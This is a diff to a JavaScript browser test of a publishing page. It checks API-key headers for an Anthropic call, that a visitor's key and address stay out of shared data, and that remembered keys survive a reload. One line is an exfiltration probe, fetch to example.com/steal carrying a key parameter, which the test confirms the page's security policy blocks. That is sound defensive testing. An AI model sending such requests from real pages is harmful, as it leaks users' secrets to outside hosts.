@@ -213,12 +213,24 @@ test('publishing: a web page and an AI program, each at its own address; paid by
   assert.equal(shared[0].inputs.text, 'helo wrold');
   assert.ok(!JSON.stringify(shared[0]).includes('gsk_visitor'), 'the visitor\u2019s key is not in it');
   assert.ok(!JSON.stringify(shared[0]).includes('127.0.0.1'), 'nor their address');
+  // Anthropic answers a page only with its browser header: the page sends it.
+  const beforeAnthropic = ai.requests.length;
+  await evaluate(`(() => { const p = document.getElementById('provider'); p.value = 'anthropic'; p.dispatchEvent(new Event('change')); return 1; })()`);
+  await sleep(200);
+  await evaluate(`(() => { document.getElementById('key').value = 'sk-ant-visitor'; document.getElementById('share').checked = false; document.getElementById('run').click(); return 1; })()`);
+  await until(() => ai.requests.length > beforeAnthropic, 'the call to Anthropic');
+  const toAnthropic = ai.requests.slice(beforeAnthropic).find(q => q.method === 'POST');
+  assert.equal(toAnthropic.headers['anthropic-dangerous-direct-browser-access'], 'true');
+  assert.equal(toAnthropic.headers['x-api-key'], 'sk-ant-visitor');
+  await waitFor(`!document.getElementById('run').disabled`, 'the page done with it');
   // The page cannot send anything to any other address: its policy says no.
   const leak = await evaluate(`fetch('https://example.com/steal?k=x').then(() => 'sent', e => 'blocked: ' + e.message)`);
   assert.match(leak, /^blocked/);
   await until(() => csp.some(c => /example\.com/.test(c)), 'the browser reports the refusal');
   // Remembered on this device: encrypted, back after a reload; forgotten on request.
-  await evaluate(`document.getElementById('remember').checked = true; document.getElementById('run').click(); 1`);
+  await evaluate(`(() => { const p = document.getElementById('provider'); p.value = 'groq'; p.dispatchEvent(new Event('change')); return 1; })()`);
+  await sleep(300);
+  await evaluate(`document.getElementById('key').value = 'gsk_visitor-own-key'; document.getElementById('remember').checked = true; document.getElementById('run').click(); 1`);
   await sleep(800);
   await send('Page.reload', {}, sid);
   await waitFor(`document.getElementById('key') && document.getElementById('key').value === 'gsk_visitor-own-key'`, 'the remembered key');
